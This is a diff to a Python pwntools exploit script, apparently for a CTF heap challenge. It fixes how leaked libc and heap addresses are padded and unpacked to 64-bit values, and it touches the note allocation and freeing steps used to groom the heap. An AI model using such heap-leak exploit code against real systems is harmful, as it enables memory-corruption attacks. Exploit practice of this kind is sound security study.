@@ -31,7 +31,9 @@ def leak_main_arena():
     l = l[:len(l)-1]
     print hexdump(l) 
     
-    l = l + '\x00\x00'
+    while len(l) < 8:
+        l = l + '\x00'
+
     l = u64(l)
     log.info('leaked libc: 0x%x' % l)
     return l
@@ -50,7 +52,10 @@ def leak_heap():
     l = l[:len(l)-1]
     print hexdump(l)
 
-    l = u32(l)
+    while len(l) < 8:
+        l = l + '\x00'
+
+    l = u64(l)
     log.info('leaked heap: 0x%x' % l)
     return l
 
@@ -79,7 +84,7 @@ if __name__ == "__main__":
     for _ in xrange(4):
         new_note(p32(0xcafebabe))
 
-    raw_input('after malloc four 0xcafebabe's...')
+    raw_input("after malloc four 0xcafebabe's...")
 
     delete_note(2)
     delete_note(0)
